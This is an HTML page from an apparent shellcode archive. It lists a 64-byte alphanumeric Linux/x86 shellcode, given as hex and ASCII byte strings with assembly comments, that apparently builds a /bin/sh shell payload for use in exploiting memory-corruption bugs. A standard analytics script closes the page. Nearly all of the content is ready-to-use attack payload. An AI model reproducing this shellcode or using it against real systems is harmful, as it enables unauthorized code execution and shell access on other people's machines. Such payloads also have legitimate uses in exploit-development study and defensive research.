<html><head><title>Linux/x86 - alpha-numeric - 64 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
     /*--------------------------------------*/
     /*   64 byte alpha-numeric shellcode    */
     /*        by XORt@dallas_2600   64bytes */
     /*--------------------------------------*/
     &quot;\x6a\x30&quot;         /* pushb $0x30       */
     &quot;\x58&quot;             /* pop %eax          */
     &quot;\x34\x30&quot;         /* xorb $0x30, %al   */
     &quot;\x50&quot;             /* push %eax         */
     &quot;\x5a&quot;             /* pop %edx          */
     &quot;\x48&quot;             /* dec %eax          */
     &quot;\x66\x35\x41\x30&quot; /* xorl $0x3041, %ax */
     &quot;\x66\x35\x73\x4f&quot; /* xorl $0x4f73, %ax */ 
     &quot;\x50&quot;             /* push %eax         */
     &quot;\x52&quot;             /* pushl %edx        */
     &quot;\x58&quot;             /* pop %eax          */
     &quot;\x684J4A&quot;         /* pushl &quot;4J4A&quot;      */
     &quot;\x68PSTY&quot;         /* pushl &quot;PSTY&quot;      */
     &quot;\x68UVWa&quot;         /* pushl &quot;UVWa&quot;      */
     &quot;\x68QRPT&quot;         /* pushl &quot;QRPT&quot;      */
     &quot;\x68PTXR&quot;         /* pushl &quot;PTXR&quot;      */
     &quot;\x68binH&quot;         /* pushl &quot;binH&quot;      */
     &quot;\x68IQ50&quot;         /* pushl &quot;IQ50&quot;      */
     &quot;\x68shDY&quot;         /* pushl &quot;shDY&quot;      */
     &quot;\x68Rha0&quot;         /* pushl &quot;Rha0&quot;      */
     /*--------------------------------------*/




<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
